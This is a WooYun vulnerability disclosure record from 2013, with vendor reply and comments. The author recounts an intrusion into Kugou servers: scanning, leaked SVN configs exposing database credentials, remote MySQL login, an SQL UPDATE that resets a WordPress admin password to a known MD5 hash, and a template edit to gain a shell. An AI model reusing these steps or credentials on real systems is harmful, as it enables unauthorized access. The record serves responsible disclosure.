{"id": 11916, "wybug_id": "wooyun-2013-023605", "wybug_title": "酷狗可被轻易渗透漏洞暴露脆弱安全架构", "wybug_corp": "酷狗", "wybug_author": "nightwi3h", "wybug_date": "2013-05-13 09:23", "wybug_open_date": "2013-06-27 09:23", "wybug_type": "系统/服务运维配置不当", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["安全意识不足", "默认配置不当", "服务配置不当", "源代码泄漏"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-05-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-05-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-05-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-06-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-06-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-06-27：\t细节向公众公开  简要描述： 今天上百度准备看一集火影睡了，没成想tudou被劫持了。-_-||!打开酷狗音乐吧，听听现场主播哼几首就睡了，结果木钱钱。-_-||!那就进去看看吧！Let's Go!~Ps：xsser我想问一句，Rank有木有40 60?（鉴于对酷狗整体架构持久影响，详细说明做了模糊处理，未模糊版本联系nightwi3h@qq.com索取） 详细说明：  No.0 分析判断：　　酷狗作为以流媒体服务为主的厂商，肯定不少CDN、分发负载、P2P管理之类的服务器，作为木钱钱的人士，还是奔内网数据库去吧！　　难点在于如何抛开酷狗大量的CDN找到脆弱的系统边界。No.1 搜集信息：　　于是乎，Google墙的太厉害，借助度娘吧。找到两个比较目测没有加CDN的域名：xxx1.kugou.com[113.106.x.x3] xxx2.kugou.com [183.60.x.x] 183.60段比较熟悉，作为一个业余的安全运维，这个段很多高防，当然CDN也比较多，放弃吧。　　扫描下113.106.x.x3/24吧：(仅仅留下后续有用的结果)　　\n113.106.x.x1 H3C Router　　113.106.x.x3 3306　　113.106.x.x7 3306　　113.106.x.x9 3306　　113.106.x.x9 80\n　　分析：看来H3C后面都是酷狗的了，重点关注一下吧:)　　挂上SRCWVS[http://www.srcwork.com] 扫描一下Web吧，轻易获得一个SVN源码泄露：http://113.106.x.x9/admin/x/xfig/.svn/text-base/test.inc.php.svn-base \n　　$dbConfig['default'] = array(　　\t'DB_TYPE' => 'mysql',　　\t'DB_CHARSET' => 'utf8',　　\t'DB_PERSISTENT' => false,　　\t'DB_HOST'=>'10.10.10.7',　　\t'DB_USER'=>'admin',　　\t'DB_PASSWD'=>'jjxx',　　\t'DB_NAME'=>'mv',　　);　　//推荐数据库配置。　　$dbConfig['tuijian'] = array(　　\t'DB_TYPE' => 'mysql',　　\t'DB_CHARSET' => 'utf8',　　\t'DB_PERSISTENT' => false,　　\t'DB_HOST'=>'10.10.10.3',　　\t'DB_USER'=>'outtransql',　　\t'DB_PASSWD'=>'xxoo',　　\t'DB_NAME'=>'tuijian'　　\n　　（获得酷狗PHP框架源码和内网数据库连接信息）　　No.3：分析：x9这台源码应该是酷狗自己开发的PHP框架，安全性还不错，简单的Code漏洞基本上没啥，不过最想的先取个BashShell。既然框架不能利用，数据库在内网。咋办呢？瓶颈来了。给我一首歌的时间。哦，懂了这种开发测试机一般都会写距离本机不远的数据库，试试人品？　　No.4:数据库新发现：\n　　10.10.10.7 10.10.10.3 10.10.10.9　　113.106.x.x7 113.106.x.x3 113.106.x.x9\n　　懂了，这种貌似是3306没防火外联了　　Cmd>mysql -h 113.106.x.x3 -u outtransql -p　　　　Bingo! 数据库OK！\n　　mysql> show databases;　　+--------------------+　　| Database           |　　+--------------------+　　| information_schema |　　| StandardMusic      |　　| UnStandardMusic    |　　| cloud              |　　| cr_debug           |　　| imagesetting       |　　| ios_jingpin        |　　| jinzhj             |　　| klok               |　　| kml                |　　| kugou01            |　　| kugoublog          | 　　+--------------------+　　32 rows in set\n　　　　数据库很多，用户权限都是root，都允许远程登录(我有预感，这回酷狗悲剧了-_-||)　　　　No.5寻找数据库突破目标：　　经过以上测试后，连接上的几个数据库内容丰富，但是如何能利用数据库进入酷狗内网呢？对了，就你了，KugouX库，看内容是个WordPress的Blog，恩不错。　　果断X.kugou.com 原来是个未完工的Blog，好吧，别怪我了。\n　　update kg_users set user_pass='21232f297a57a5a743894a0e4a801fc3’ where user_login='Xadmin';\n　　登录-改模板-获取BashShell OK！　　　　No.6：简单的架构分析：　　Web几个报错可以判定：酷狗用的是NFS（或者其他网络文件系统）/data0 /data1 /data2　　好吧：\n　　[/data2/www.kugou.com/]$ ls　　2012　　clientshare　　common　　default.html　　download　　fm2　　..........　　yueku　\n　　Ps:看来该收手了，点到为止吧，改首页什么的不是我的菜！（顺道BS一下那个劫持土豆的，我都搞定了，我的DNS Flush的N+1次居然还没好，你娃是不是改了别人NS哦- -）　　最后说几句：除了PHPShell，其他动过的都改回来了。   漏洞证明：  \n\n有图有WB   修复方案：  　　想听我说吗？No.1.2.3.4.5.6.7.8.9.N(Ps:不是我懒，太晚了睡了，明天学校坑爹的数电考试啊 - -悲剧。)这个修复方案可以写成一整套方案了（前提是比较了解酷狗架构之后）就暂时不写了。祝你们把酷狗做的更好！我是忠实用户。   版权声明：转载请注明来源 nightwi3h@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2013-05-13 09:37 厂商回复： 我只能说碉堡了，感谢对酷狗的关注。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-05-13 09:34 |    \t\tNicky \t\t\t( 普通白帽子  |\t\t\t        Rank:477 漏洞数:68        | http://www.droidsec.cn 安卓安全中文站)\t\t \n  看起来很NB的感觉，看厂商怎么回复。    \n     2013-05-13 09:46 |    \t\t淡漠天空  \t\t\t( 实习白帽子  |\t\t\t        Rank:1113 漏洞数:141        | M:出售GOV  STATE NSA CIA NASA DHS Symant...)\t\t \n  看起来很NB的感觉    \n     2013-05-13 09:50 |    \t\tNicky \t\t\t( 普通白帽子  |\t\t\t        Rank:477 漏洞数:68        | http://www.droidsec.cn 安卓安全中文站)\t\t \n  厂商确认真快。    \n     2013-05-13 09:50 |    \t\tppt \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | ) | ( 我猜出了用户名，可我没猜出密码。)\t\t \n  厂商的回复，碉堡了    \n     2013-05-13 09:54 |    \t\t追水哥 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:2        | 追水哥逆袭乌云！)\t\t \n  虽然不懂你们说什么，但看起来很牛B的感觉    \n     2013-05-13 10:13 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:17        | 当我又回首一切,这个世界会好吗?)\t\t \n  有人关注到安全架构了    \n     2013-05-13 10:18 |    \t\t斯文的鸡蛋 \t\t\t( 普通白帽子  |\t\t\t        Rank:173 漏洞数:40        | 我在这头，你在那头~)\t\t \n  不明觉历    \n     2013-05-13 12:43 |    \t\t风萧萧  \t\t\t( 核心白帽子 |\t\t\t        Rank:1020 漏洞数:70        | 人这一辈子总要动真格的爱上什么人)\t\t \n  碉堡啊！    \n     2013-05-13 13:01 |    \t\tGetshell \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:2        )\t\t \n   不明觉厉    \n     2013-06-12 11:15 |    \t\tCroxy \t\t\t( 普通白帽子  |\t\t\t        Rank:513 漏洞数:52        | 只会送人头)\t\t \n  洞主真NB    \n     2013-06-12 11:34 |    \t\t蘑菇 \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:1        | 没有做不到的，只有想不到的！)\t\t \n  不明觉厉啊...晕乎乎的    \n     2013-06-13 09:57 |    \t\t银冥币 \t\t\t( 实习白帽子  |\t\t\t        Rank:35 漏洞数:19        | \"/upload/avatar/avatar_251_b.jpg\" />)\t\t \n  学习orz    \n     2013-06-13 10:51 |    \t\t风之传说 \t\t\t( 普通白帽子  |\t\t\t        Rank:138 漏洞数:28        | 借用朋友的一句话，你的时间在哪里，你的成...)\t\t \n  对酷狗这么了解？    \n     2013-06-27 10:05 |    \t\txiaogui \t\t\t( 实习白帽子  |\t\t\t        Rank:88 漏洞数:15        | 围观大牛来了~~~)\t\t \n  不明觉厉    \n     2013-08-01 16:13 |    \t\tsaline \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:29        | Focus On Web Secur1ty)\t\t \n  WordPress的Blog密码可以user_pass='21232f297a57a5a743894a0e4a801fc3’  ？？    \n     2013-08-04 12:59 |    \t\tnightwi3h \t\t\t( 实习白帽子  |\t\t\t        Rank:38 漏洞数:2        | 桐梓林南路凌晨包子摊摊主)\t\t \n  @saline 是可以的啊，WP存储密码的格式可以是他自己定义的，若是被改成MD5也是可以识别的，不信可以自己搭建一个WP试试。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}